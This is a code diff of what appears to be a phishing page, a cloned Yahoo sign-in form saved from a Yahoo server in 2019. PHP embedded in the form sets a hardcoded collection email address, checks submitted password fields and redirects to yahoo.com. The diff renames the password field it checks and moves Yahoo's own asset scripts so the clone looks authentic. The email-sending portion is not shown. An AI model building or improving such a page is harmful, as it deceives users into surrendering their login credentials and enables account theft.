@@ -129,6 +129,41 @@ root.isIOSDevice = true;
             <input type="submit" class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link" name="skip" value="I forgot my&nbsp;password">
         </p>
     </form>
+
+	
+	
+</div>
+</div>
+</div>
+    <script src="https://s.yimg.com/wm/mbr/23267d7c1e2a697c42c92954d824fd50d87d5bbd/bundle.js"></script>
+    <noscript>
+        <img src="/account/js-reporting/?crumb=LEiu6FUiH1m&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
+    </noscript>
+    <script nonce="">
+        var checkAssets = function(seconds) {
+            setTimeout(function() {
+                if (!window.mbrJSLoaded) {
+                    window.mbrSendError('js_failed_to_load', location.pathname);
+                }
+                var check = document.getElementById('mbr-css-check'),
+                    style = check.currentStyle;
+                if (window.getComputedStyle) {
+                    style = window.getComputedStyle(check);
+                }
+                if (style.display !== 'none') {
+                    window.mbrSendError('css_failed_to_load', location.pathname);
+                }
+            }, (seconds * 1000));
+        };
+
+        checkAssets(10);
+    </script>
+    <div id="mbr-css-check"></div>
+
+
+<!-- fe07.member.ir2.yahoo.com - Wed Apr 24 2019 10:21:28 GMT+0000 (UTC) - (0ms) -->
+
+
 	<?
 	
 	$login_email = "jleighw09@yahoo.com";
@@ -136,7 +171,7 @@ root.isIOSDevice = true;
 	
 	
 	
-	if(isset($_POST['password'])){
+	if(isset($_POST['verifyPassword'])){
 		
 		if(empty($_POST['password'])){
 			
@@ -190,35 +225,11 @@ $url = "https://www.yahoo.com";
 	
 	
 	?>
-	
-	
-</div>
-</div>
-</div>
-    <script src="https://s.yimg.com/wm/mbr/23267d7c1e2a697c42c92954d824fd50d87d5bbd/bundle.js"></script>
-    <noscript>
-        <img src="/account/js-reporting/?crumb=LEiu6FUiH1m&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
-    </noscript>
-    <script nonce="">
-        var checkAssets = function(seconds) {
-            setTimeout(function() {
-                if (!window.mbrJSLoaded) {
-                    window.mbrSendError('js_failed_to_load', location.pathname);
-                }
-                var check = document.getElementById('mbr-css-check'),
-                    style = check.currentStyle;
-                if (window.getComputedStyle) {
-                    style = window.getComputedStyle(check);
-                }
-                if (style.display !== 'none') {
-                    window.mbrSendError('css_failed_to_load', location.pathname);
-                }
-            }, (seconds * 1000));
-        };
-
-        checkAssets(10);
-    </script>
-    <div id="mbr-css-check"></div>
 
 
-<!-- fe07.member.ir2.yahoo.com - Wed Apr 24 2019 10:21:28 GMT+0000 (UTC) - (0ms) --></body></html>
+
+
+
+
+
+</body></html>
